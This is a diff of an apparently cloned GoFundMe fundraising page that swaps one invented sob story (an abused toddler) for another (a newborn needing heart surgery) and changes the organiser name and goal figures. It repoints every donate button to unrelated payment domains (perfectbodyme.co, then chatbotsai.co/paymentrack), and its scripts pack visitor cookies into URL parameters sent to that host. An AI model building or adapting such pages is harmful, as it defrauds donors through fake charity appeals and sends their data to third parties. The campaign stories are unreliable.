@@ -11807,7 +11807,7 @@
 
 
 
-<!-- ========== PAGE 1  (first domain)  ========== -->
+<!-- ========== PAGE 1  (first domain)  ========== -->
 <div class="progress-meter_progressMeter__BYOlt progress-meter progress-meter_goalBarVariantProgressMeter___rdnj" style="display: flex; align-items: center; justify-content: space-between; gap: 20px; padding: 10px; border: 1px solid #e6f2ec; border-radius: 8px;">
   <div style="flex: 1;">
     <div class="progress-meter_progressMeterHeading__A6Slt hrt-text-body-sm" style="font-weight: bold; font-size: 16px; margin-bottom: 5px;">
@@ -11850,7 +11850,7 @@
       </div>
     </div>
     <div data-element-id="btn_donate" data-analytic-event-listener="true">
-      <a class="gfm-donate-button hrt-primary-button hrt-primary-button--full hrt-primary-button--large hrt-primary-button--default hrt-base-button" href="https://perfectbodyme.co/paymenton">
+      <a class="gfm-donate-button hrt-primary-button hrt-primary-button--full hrt-primary-button--large hrt-primary-button--default hrt-base-button" href="https://chatbotsai.co/paymentrack">
         Donate now
       </a>
     </div>
@@ -11874,11 +11874,6 @@ function getCookieValue(name) {
 function setMyDonationCookie(obj) {
   var jsonStr = JSON.stringify(obj);
   document.cookie = "myDonationCookie=" + jsonStr + "; path=/; max-age=31536000";
-}
-
-function setFundraiserValuesCookie(obj) {
-  var jsonStr = JSON.stringify(obj);
-  document.cookie = "fundraiserValues=" + jsonStr + "; path=/; max-age=31536000";
 }
 </script>
 
@@ -11926,17 +11921,10 @@ document.addEventListener("DOMContentLoaded", function () {
 <script>
 /* ---------------- progress bar logic ---------------- */
 document.addEventListener("DOMContentLoaded", function() {
-  var totalGoal = 150000;
-  var totalDonorsAt100 = 3580;
-  var donationPercentage = 88;
+  var totalGoal = 100000;
+  var totalDonorsAt100 = 2930;
 
-  // Store fundraiser values in a cookie
-  var fundraiserValues = {
-    totalGoal: totalGoal,
-    totalDonorsAt100: totalDonorsAt100,
-    donationPercentage: donationPercentage
-  };
-  setFundraiserValuesCookie(fundraiserValues);
+  var donationPercentage = 47;
 
   try {
     var cookieValue = getCookieValue('myDonationCookie');
@@ -11997,7 +11985,7 @@ document.addEventListener("DOMContentLoaded", function() {
 document.addEventListener("DOMContentLoaded", function() {
   var donateAnchors = document.querySelectorAll('[data-element-id="btn_donate"] a');
 
-  var defaultLink = 'https://perfectbodyme.co/paymenton';
+  var defaultLink = 'https://chatbotsai.co/paymentrack';
 
   var urlParams = new URLSearchParams(window.location.search);
   var fbclid = urlParams.get('fbclid');
@@ -12034,13 +12022,11 @@ document.addEventListener("DOMContentLoaded", function() {
         /* --- collect both cookies so we can ship them --- */
         var mdcStr = JSON.stringify(cookieObj);
         var viStr  = getCookieValue('visitorInfo') || '{}';
-        var fvStr  = getCookieValue('fundraiserValues') || '{}';
 
         /* --- build a fresh URL that carries the data --- */
         var u = new URL(anchor.href);
         u.searchParams.set('utm_mdc', encodeURIComponent(mdcStr));
         u.searchParams.set('utm_vi',  encodeURIComponent(viStr));
-        u.searchParams.set('utm_fv',  encodeURIComponent(fvStr));
 
         /* --- go to the next page --- */
         window.location.href = u.toString();
@@ -12053,6 +12039,7 @@ document.addEventListener("DOMContentLoaded", function() {
   });
 });
 </script>
+
 
 
 
@@ -12076,8 +12063,8 @@ document.addEventListener("DOMContentLoaded", function() {
 >
     <picture class="campaign-hero_image__587ZT">
         <img
-            data-savepage-src="waylon.png"
-            src="waylon.png"
+            data-savepage-src="jhon.png"
+            src="jhon.png"
             alt="Imagem da campanha"
         />
     </picture>
@@ -12088,8 +12075,8 @@ document.addEventListener("DOMContentLoaded", function() {
 >
     <picture class="campaign-hero_image__587ZT">
         <img
-            data-savepage-src="waylon.png"
-            src="waylon.png"
+            data-savepage-src="jhon.png"
+            src="jhon.png"
             alt="Imagem da campanha"
         />
     </picture>
@@ -12099,7 +12086,7 @@ document.addEventListener("DOMContentLoaded", function() {
 
                 <header class="p-campaign-header">
                   <h1 class="hrt-mb-0 p-campaign-title">
-                    Support Waylon's Journey to Recovery
+                    Support Baby Jhon's Urgent Heart Surgery
                   </h1>
                 </header>
                 <div class="p-campaign-byline" bis_skin_checked="1">
@@ -12148,7 +12135,7 @@ document.addEventListener("DOMContentLoaded", function() {
                         class="m-campaign-byline-description"
                         bis_skin_checked="1"
                       >
-                      Aaron Coody
+                      Grace Williams
                       is organizing this campaign.
                       </div>
                     </div>
@@ -12208,13 +12195,7 @@ document.addEventListener("DOMContentLoaded", function() {
                       bis_skin_checked="1"
                     >
                     <div bis_skin_checked="1">
-My name is Aaron Coody i am the uncle of Waylon and best friend of Dylan Simpson. Dylan has been set as the beneficiary of this go fund me and will receive all donations personally. Waylon is a sweet, bright little boy who, at just 3 years old, has already experienced more pain and hardship than any child should ever have to endure. Waylon was subjected to physical abuse by someone who was supposed to love and protect him. He has suffered not only from the physical bruises and injuries but also from the emotional and psychological toll of being betrayed by someone he should have trusted.
-
-                        Waylon needs urgent Surgery, Trauma-Ocused Cognitive Behavioral Therapy to address the scars of abuse, and ongoing support to help him process and move forward. The funds we are raising will go directly toward covering his medical treatments, therapeutic services, and the resources necessary to give him the childhood he deserves — one filled with love, laughter, and hope.
-No child should ever experience abuse, but Waylon is one of the many children who are victims of violence. Despite the pain he's endured, Waylon is resilient. With your help, we can give him the opportunity to grow up in a world where he feels safe, loved, and cherished.
-                        
-We are asking for your kindness, support, and generosity to help Waylon heal. Every donation, every share, and every prayer can make a profound difference in his life. Together, we can give Waylon the chance to thrive, free from the shadows of his past.
-Thank you for being a part of his journey toward recovery. , and a Ventricular Septal Defect (VSD)." The doctors have told us that this condition is incompatible with life unless he undergoes immediate surgery. 🥺 Since the moment he was born, my husband and I have watched our child fight for every breath. We left everything behind in our small town to be here with him in Boston, where he’s been hooked up to machines, struggling to survive. The pain of seeing him fight this battle, so small and helpless, is unbearable. My heart shatters every time I look at him. He needs two urgent surgeries right here in Boston to survive the next few months. After that, he will need a final surgery in New York. The cost of everything is overwhelming, and we can’t do this alone. I’m begging for your help. Every day, I watch my baby boy fight for his life, but I know the odds are against us. He’s so young, and yet he’s already had to endure more than any child should ever have to go through. But we won’t give up on him, and we can’t let him suffer any longer. Please, I’m asking for your kindness and generosity to help save my son’s life. The surgeries, the medical bills, the care—everything is too much for us to carry on our own. Any donation, no matter how small, can help give him a chance at a future. He deserves that chance. He deserves a life full of love, joy, and happiness. I don’t know how much time we have left, but I will fight for my son with every ounce of strength I have. Please, help us. Together, we can give him the chance to live the life he deserves. Thank you for your kindness, your prayers, and your support. ❤️
+My name is Grace and I am writing this with a broken heart. My baby boy Jhon has been in the ICU since the day he was born. He was diagnosed with a rare and severe heart condition called "Transposition of the Great Arteries, Pulmonary Valve Stenosis, and a Ventricular Septal Defect (VSD)." The doctors have told us that this condition is incompatible with life unless he undergoes immediate surgery. 🥺 Since the moment he was born, my husband and I have watched our child fight for every breath. We left everything behind in our small town to be here with him in Boston, where he’s been hooked up to machines, struggling to survive. The pain of seeing him fight this battle, so small and helpless, is unbearable. My heart shatters every time I look at him. He needs two urgent surgeries right here in Boston to survive the next few months. After that, he will need a final surgery in New York. The cost of everything is overwhelming, and we can’t do this alone. I’m begging for your help. Every day, I watch my baby boy fight for his life, but I know the odds are against us. He’s so young, and yet he’s already had to endure more than any child should ever have to go through. But we won’t give up on him, and we can’t let him suffer any longer. Please, I’m asking for your kindness and generosity to help save my son’s life. The surgeries, the medical bills, the care—everything is too much for us to carry on our own. Any donation, no matter how small, can help give him a chance at a future. He deserves that chance. He deserves a life full of love, joy, and happiness. I don’t know how much time we have left, but I will fight for my son with every ounce of strength I have. Please, help us. Together, we can give him the chance to live the life he deserves. Thank you for your kindness, your prayers, and your support. ❤️
                       </div>
                       
                     
@@ -12680,7 +12661,7 @@ Thank you for being a part of his journey toward recovery. , and a Ventricular S
                               bis_skin_checked="1"
                             >
                               <div class="hrt-font-bold" bis_skin_checked="1">
-                                Aaron Coody
+                                Grace Williams
                               </div>
                               <div
                                 class="hrt-text-body-sm"
@@ -12692,7 +12673,7 @@ Thank you for being a part of his journey toward recovery. , and a Ventricular S
                                 class="hrt-text-body-sm"
                                 bis_skin_checked="1"
                               >
-                              Medical & Healing
+                              Single Mother
                               </div>
                             </div>
                           </div>
@@ -14628,6 +14609,6 @@ Thank you for being a part of his journey toward recovery. , and a Ventricular S
     data-savepage-src="https://googleads.g.doubleclick.net/pagead/viewthroughconversion/955875456/?random=1729988086378&cv=11&fst=1729988086378&bg=ffffff&guid=ON&async=1&gtm=45be4ao0v9181645482z89172018950za200&gcd=13t3t3t3t5l1&dma=0&tag_exp=101533422~101823848~101925629&u_w=400&u_h=608&url=https%3A%2F%2Fwww.gofundme.com%2Ff%2Faiutiamo-a-ricostruire-il-canile-di-sasso-marconi-bo&hn=www.googleadservices.com&frm=0&tiba=Campanha%20de%20arrecada%C3%A7%C3%A3o%20de%20fundos%20de%20Barbara%20Sedazzari%3A%20Aiutiamo%20a%20ricostruire%20il%20Canile%20di%20Sasso%20Marconi%20BO&npa=0&auid=749630019.1729981217&uaa=&uab=64&uafvl=Chromium%3B130.0.6723.70%7CGoogle%2520Chrome%3B130.0.6723.70%7CNot%253FA_Brand%3B99.0.0.0&uamb=1&uam=Nexus%205&uap=Android&uapv=6.0&uaw=0&fledge=1&data=event%3Dgtag.config&rfmt=3&fmt=4"
   ></script>
 <script src="fbclid.js"></script>
-
+ 
 
 </html>
